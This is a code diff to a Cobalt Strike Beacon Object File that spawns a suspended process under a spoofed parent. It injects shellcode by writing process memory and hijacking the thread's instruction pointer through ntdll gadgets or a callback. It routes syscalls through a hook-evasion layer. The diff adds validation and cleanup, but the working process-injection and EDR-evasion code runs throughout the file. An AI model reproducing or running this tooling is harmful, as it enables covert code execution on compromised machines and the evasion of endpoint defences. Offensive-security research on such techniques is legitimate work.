@@ -25,6 +25,14 @@
 VX_TABLE				VxTable;
 SYNTHETIC_STACK_FRAME	SyntheticStackframe;
 
+DECLSPEC_IMPORT BOOLEAN NTAPI NTDLL$RtlFreeHeap(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlDestroyProcessParameters(PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
+DECLSPEC_IMPORT int WINAPI KERNEL32$lstrcmpiW(LPCWSTR lpString1, LPCWSTR lpString2);
+
+#define RtlFreeHeap					NTDLL$RtlFreeHeap
+#define RtlDestroyProcessParameters	NTDLL$RtlDestroyProcessParameters
+#define lstrcmpiW					KERNEL32$lstrcmpiW
+
 /**
  * @enum EXECUTION
  * @brief Shellcode execution methods supported by this BOF
@@ -35,6 +43,53 @@ typedef enum {
 	HIJACK_RIP_JMP_RBX,          /**< RIP points to JMP RBX gadget, RBX holds shellcode address */
 	HIJACK_RIP_CALLBACK_FUNCTION /**< RIP points to callback function (EnumResourceTypesW) */
 } EXECUTION;
+
+/**
+ * @brief Validates execution preconditions before thread-context modification.
+ * @note This precondition gate is the runtime fail-closed backstop for execution mode safety.
+ */
+__attribute__((always_inline)) NTSTATUS ValidateExecutionPreconditions(
+	_In_	EXECUTION	Execute,
+	_In_	BOOL		DisableCfg
+)
+{
+	if (Execute < HIJACK_RIP_DIRECT || Execute > HIJACK_RIP_CALLBACK_FUNCTION) {
+		BeaconPrintf(CALLBACK_ERROR, "[!] invalid execution method (%d) | next step: select a supported execution method and retry", Execute);
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	if (Execute == HIJACK_RIP_CALLBACK_FUNCTION && !DisableCfg) {
+		BeaconPrintf(CALLBACK_ERROR, "[!] callback blocked (cfg-disable is off) | next step: enable CFG-disable, then retry");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	return STATUS_SUCCESS;
+}
+
+/**
+ * @brief Normalizes process input to executable basename for exact matching.
+ */
+__attribute__((always_inline)) LPCWSTR NormalizeExecutableBasenameW(
+	_In_	LPCWSTR		lpcwProcessName
+)
+{
+	LPCWSTR lpcwBaseName = lpcwProcessName;
+	if (!lpcwProcessName) {
+		return NULL;
+	}
+
+	for (LPCWSTR pCursor = lpcwProcessName; *pCursor; pCursor++) {
+		if (*pCursor == L'\\' || *pCursor == L'/') {
+			lpcwBaseName = pCursor + 1;
+		}
+	}
+
+	if (!lpcwBaseName || !*lpcwBaseName) {
+		return NULL;
+	}
+
+	return lpcwBaseName;
+}
 
 
 /**
@@ -50,6 +105,8 @@ typedef enum {
  * @return TRUE if process was found, FALSE otherwise
  * 
  * @note This function uses DRAUGR_API for hook evasion on Toolhelp32 APIs
+ * @note PPID lookup enforces exact case-insensitive executable-name matching.
+ * @note Invalid PPID input or no exact match will fail closed.
  * @warning Opens a handle with PROCESS_ALL_ACCESS which may trigger detection
  */
 __attribute__((always_inline)) BOOL	GetProcessIdWithNameW(
@@ -57,6 +114,15 @@ __attribute__((always_inline)) BOOL	GetProcessIdWithNameW(
 	_Inout_	PDWORD		pdwProcessId
 )
 {
+	if (!lpcwProcessName || !pdwProcessId) {
+		return FALSE;
+	}
+
+	LPCWSTR lpcwExpectedExe = NormalizeExecutableBasenameW(lpcwProcessName);
+	if (!lpcwExpectedExe) {
+		return FALSE;
+	}
+
 	HMODULE	hKernel32	= GetModuleHandleA("Kernel32.dll");
 	if(!hKernel32) {
 		return FALSE;
@@ -88,7 +154,7 @@ __attribute__((always_inline)) BOOL	GetProcessIdWithNameW(
 
 	do
 	{
-		if (StrStrW(lpcwProcessName, pe32.szExeFile)) {
+		if (lstrcmpiW(lpcwExpectedExe, pe32.szExeFile) == 0) {
 			DRAUGR_SYSCALL(NtClose, ProcessSnap);
 			*pdwProcessId = pe32.th32ProcessID;
 			return TRUE;
@@ -212,7 +278,12 @@ NTSTATUS	SpawnAndRun(
 	NTSTATUS Status = STATUS_SUCCESS;
 
 	DWORD	dwProcessParentId = 0;
+	/* cleanup ownership: owned by SpawnAndRun, released in cleanup */
 	HANDLE	hParentProcess = NULL;
+	HANDLE	hProcess = NULL;
+	HANDLE	hThread = NULL;
+	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+	PPS_ATTRIBUTE_LIST AttributeList = NULL;
 
 	UNICODE_STRING	ImagePath = { 0 };
 	UNICODE_STRING	CurrentDirectory = { 0 };
@@ -222,11 +293,10 @@ NTSTATUS	SpawnAndRun(
 	RtlInitUnicodeString(&CurrentDirectory, lpwWorkingDir);
 	RtlInitUnicodeString(&CmdLine, lpwCmdLine);
 
-	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
 	Status = RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, &CurrentDirectory, &CmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
 	if (NT_ERROR(Status)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] RtlCreateProcessParametersEx failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	PS_CREATE_INFO CreateInfo = { 0 };
@@ -247,8 +317,9 @@ NTSTATUS	SpawnAndRun(
 		NbrOfAttributes++;
 			
 		if (!GetProcessIdWithNameW(lpwParentProcessName, &dwProcessParentId)) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find parent process: %ws", lpwParentProcessName);
-			return STATUS_INVALID_PARAMETER_2;
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find parent process: %ws | next step: provide an exact executable name (e.g., explorer.exe) and retry", lpwParentProcessName);
+			Status = STATUS_INVALID_PARAMETER_2;
+			goto cleanup;
 		}
 		// BeaconPrintf(CALLBACK_OUTPUT, "[*] Spoofing PPID with process %ws (PID: %d)", lpwParentProcessName, dwProcessParentId);
 
@@ -260,15 +331,16 @@ NTSTATUS	SpawnAndRun(
 		Status = DRAUGR_SYSCALL(NtOpenProcess, &hParentProcess, PROCESS_ALL_ACCESS, &oA, &cId);
 		if (NT_ERROR(Status)) {
             BeaconPrintf(CALLBACK_ERROR, "[!] NtOpenProcess failed at line %d with status 0x%llx", __LINE__, Status);
-			return Status;
+			goto cleanup;
 		}
 	}
 
 	DWORD AttributeSize = sizeof(PS_ATTRIBUTE_LIST) + (NbrOfAttributes * sizeof(PS_ATTRIBUTE));
 
-	PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributeSize);
+	AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributeSize);
 	if (!AttributeList) {
-		return STATUS_INSUFFICIENT_RESOURCES;
+		Status = STATUS_INSUFFICIENT_RESOURCES;
+		goto cleanup;
 	}
 
 	DWORD64	dwProcessPolicy = 0;
@@ -306,13 +378,10 @@ NTSTATUS	SpawnAndRun(
 		AttributeList->Attributes[cx].Value = hParentProcess;
 	}
 
-	HANDLE hProcess = NULL;
-	HANDLE hThread = NULL;
-
 	Status = DRAUGR_SYSCALL(NtCreateUserProcess, &hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
 	if (NT_ERROR(Status)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateUserProcess failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	/*	-------------------
@@ -330,7 +399,7 @@ NTSTATUS	SpawnAndRun(
 	
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtAllocateVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 	
 	/*	-------------------
@@ -340,13 +409,18 @@ NTSTATUS	SpawnAndRun(
 	Status = DRAUGR_SYSCALL(NtWriteVirtualMemory, hProcess, lpAllocatedAddress, Shellcode, ShellcodeSize, &nWrittenBytes);
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtWriteVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	/*	-------------------
 		EXECUTE SHELLCODE
 		------------------- */
 	ULONG oldProtect = 0;
+
+	Status = ValidateExecutionPreconditions(Execute, DisableCfg);
+	if (NT_ERROR(Status)) {
+		goto cleanup;
+	}
 
 	switch (Execute) {
 		case(HIJACK_RIP_DIRECT):
@@ -357,7 +431,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rip = (DWORD64)lpAllocatedAddress;
@@ -365,7 +439,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -379,7 +453,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID GadgetJmpRax = NULL;
 			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRax, sizeof(JmpRax), &GadgetJmpRax)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RAX gadget in ntdll.dll");
-				return STATUS_DATA_ERROR;
+				Status = STATUS_DATA_ERROR;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -388,7 +463,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rax = (DWORD64)lpAllocatedAddress;
@@ -397,7 +472,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -411,7 +486,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID GadgetJmpRbx = NULL;
 			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRbx, sizeof(JmpRbx), &GadgetJmpRbx)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RBX gadget in ntdll.dll");
-				return STATUS_DATA_ERROR;
+				Status = STATUS_DATA_ERROR;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -420,7 +496,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rbx = (DWORD64)lpAllocatedAddress;
@@ -429,7 +505,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -440,7 +516,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID	CallbackFunction = GetProcAddress(Kernel32, "EnumResourceTypesW");
 			if (!CallbackFunction) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find EnumResourceTypesW");
-				return STATUS_PROCEDURE_NOT_FOUND;
+				Status = STATUS_PROCEDURE_NOT_FOUND;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -449,7 +526,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rcx = NULL;
@@ -460,7 +537,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -470,14 +547,42 @@ NTSTATUS	SpawnAndRun(
 		Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, hProcess, &lpAllocatedAddress, &nTempSize, PAGE_EXECUTE_READ, &oldProtect);
 		if (NT_ERROR(Status)) {
 	    	BeaconPrintf(CALLBACK_ERROR, "[!] NtProtectVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-			return Status;
+			goto cleanup;
 		}
 	}
 	Status = DRAUGR_SYSCALL(NtResumeProcess, hProcess);
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtResumeProcess failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
+
+cleanup:
+	/* owned by SpawnAndRun and released in cleanup */
+	if (hThread) {
+		DRAUGR_SYSCALL(NtClose, hThread);
+		hThread = NULL;
+	}
+
+	if (hProcess) {
+		DRAUGR_SYSCALL(NtClose, hProcess);
+		hProcess = NULL;
+	}
+
+	if (hParentProcess) {
+		DRAUGR_SYSCALL(NtClose, hParentProcess);
+		hParentProcess = NULL;
+	}
+
+	if (AttributeList) {
+		RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
+		AttributeList = NULL;
+	}
+
+	if (ProcessParameters) {
+		RtlDestroyProcessParameters(ProcessParameters);
+		ProcessParameters = NULL;
+	}
+	/* cleanup ownership boundaries end here: all owned resources released in cleanup */
 
 	return Status;
 }
@@ -502,6 +607,15 @@ NTSTATUS	SpawnAndRun(
  * - i: UseRWX (integer)
  * - i: MemExec (integer - execution method)
  * - b: Shellcode (binary data)
+ *
+ * MemExec mapping (must match BOF_spawn.cna):
+ * - 0: Hijack RIP Direct
+ * - 1: Hijack RIP Jmp Rax
+ * - 2: Hijack RIP Jmp Rbx
+ * - 3: Hijack RIP Callback
+ *
+ * @warning Contract-critical order: CNA uses bof_pack("ZZZZiiiib", ...)
+ *          and parser order below MUST remain in lockstep.
  * 
  * @note This function initializes VxTable and Draugr before execution
  */
@@ -543,6 +657,11 @@ void go(
     UseRWX          = BeaconDataInt(&parser);
     MemExec         = BeaconDataInt(&parser);
 
+	NTSTATUS Status = ValidateExecutionPreconditions((EXECUTION)MemExec, DisableCfg);
+	if (NT_ERROR(Status)) {
+		return;
+	}
+
 /*
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Mitigation Policies:");
     BeaconPrintf(CALLBACK_OUTPUT, "    Block DLL policy:    %s", BlockDllPolicy ? "Enabled" : "Disabled");
@@ -565,7 +684,7 @@ void go(
 		return;
 	}
 
-    NTSTATUS Status = SpawnAndRun(
+    Status = SpawnAndRun(
 		lpwProcessName,
 		lpwParentProcessName,
 		lpwWorkingDir,
